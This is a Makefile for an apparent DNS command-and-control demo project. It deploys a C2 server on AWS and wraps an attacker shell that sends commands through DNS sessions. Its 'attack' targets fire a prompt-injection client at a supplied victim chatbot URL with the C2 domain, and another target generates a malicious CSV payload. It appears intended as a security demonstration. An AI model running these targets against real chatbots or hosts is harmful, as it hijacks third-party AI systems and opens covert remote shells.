setup-env:
	python3 -m venv venv
	. venv/bin/activate && python3 -m pip install --upgrade pip

install: setup-env
	@if [ -z "$$VIRTUAL_ENV" ]; then \
		echo "Activating venv and installing dependencies..."; \
		. venv/bin/activate && python3 -m pip install -r requirements.txt; \
	else \
		python3 -m pip install -r requirements.txt; \
	fi

activate-venv:
	. venv/bin/activate

terraform-yolo:
	@pushd terraform > /dev/null && terraform init && terraform plan && terraform apply -auto-approve && popd > /dev/null
	@echo ""
	@echo "✓ Infrastructure deployed!"
	@echo ""
	@echo "Run: source set_env_vars.sh"
	@echo "Then: make configure-ec2"
	make configure-ec2

set-env-vars:
	echo "⚠️⚠️ You cannot set environment variables via Makefile. Run it with this command:"
	@echo "	source set_env_vars.sh"

configure-ec2:
	@bash -c 'source set_env_vars.sh && bash scripts/configure_ec2.sh'

test-dns:
	@bash -c 'source set_env_vars.sh && python3 test_dns.py --domain $$DOMAIN'

operator:
	@bash -c 'source set_env_vars.sh && . venv/bin/activate && python3 src/attacker_shell.py $(VERBOSE) interactive'

sandbox:
	@python3 execute_payload.py

shell-interactive:
	@bash -c 'source set_env_vars.sh && . venv/bin/activate && python3 src/attacker_shell.py $(VERBOSE) interactive'

shell-interactive-verbose:
	@bash -c 'source set_env_vars.sh && . venv/bin/activate && python3 src/attacker_shell.py --verbose interactive'

# Testing
test:
	@echo "Running DNS protocol tests..."
	@python3 tests/test_dns_protocol.py
	@echo ""
	@echo "Running DNS server tests..."
	@python3 tests/test_dns_server.py
	@echo ""
	@echo "Running integration tests..."
	@python3 tests/test_dns_integration.py

test-verbose:
	@echo "Running DNS protocol tests (verbose)..."
	@python3 tests/test_dns_protocol.py -v
	@echo ""
	@echo "Running DNS server tests (verbose)..."
	@python3 tests/test_dns_server.py -v
	@echo ""
	@echo "Running integration tests (verbose)..."
	@python3 tests/test_dns_integration.py -v

shell-generate:
	@bash -c 'source set_env_vars.sh && python3 src/attacker_shell.py generate --show'

shell-send:
	@bash -c 'source set_env_vars.sh && python3 src/attacker_shell.py send "$(CMD)" --session $(SESSION)'

shell-receive:
	@bash -c 'source set_env_vars.sh && python3 src/attacker_shell.py receive --session $(SESSION)'

kill-session:
	@python3 kill_session.py

logs:
	@echo "📊 Tailing DNS C2 server logs from CloudWatch..."
	@echo "   Log Group: /aws/ec2/dns-c2-server"
	@echo ""
	@aws logs tail /aws/ec2/dns-c2-server --follow --region us-east-1

check-dns:
	@bash -c 'source set_env_vars.sh && bash scripts/check_dns_status.sh'

# Upload updated DNS server to S3, then deploy and restart on EC2
update-dns:
	@pushd terraform > /dev/null && terraform apply -auto-approve -target=aws_s3_object.dns_server_with_api && popd > /dev/null
	@$(MAKE) configure-ec2

terraform-destroy:
	@pushd terraform > /dev/null && terraform destroy && popd > /dev/null

# =============================================================================
# Attack Commands (for realistic prompt injection demo)
# =============================================================================

# Send prompt injection attack to victim chatbot
# Usage: make attack TARGET=https://chatbot.victim.com
attack:
	@if [ -z "$(TARGET)" ]; then \
		echo "Usage: make attack TARGET=https://victim-chatbot.com"; \
		echo ""; \
		echo "Or set VICTIM_URL environment variable:"; \
		echo "  export VICTIM_URL=https://victim-chatbot.com"; \
		echo "  make attack"; \
		exit 1; \
	fi
	@bash -c 'source set_env_vars.sh && . venv/bin/activate && python3 src/attack_client.py --target $(TARGET) --c2-domain $$DOMAIN'

# Generate malicious CSV for manual upload
# Usage: make generate-csv
generate-csv:
	@bash -c 'source set_env_vars.sh && . venv/bin/activate && python3 src/csv_payload_generator.py --c2-domain $$DOMAIN'

# Generate CSV with custom session ID
# Usage: make generate-csv-session SESSION=sess_abc123
generate-csv-session:
	@bash -c 'source set_env_vars.sh && . venv/bin/activate && python3 src/csv_payload_generator.py --c2-domain $$DOMAIN --session $(SESSION)'

.PHONY: setup-env install activate-venv terraform-yolo set-env-vars configure-ec2 \
        test-dns operator sandbox shell-interactive shell-interactive-verbose test \
        test-verbose shell-generate shell-send shell-receive kill-session logs \
        check-dns update-dns terraform-destroy attack generate-csv generate-csv-session
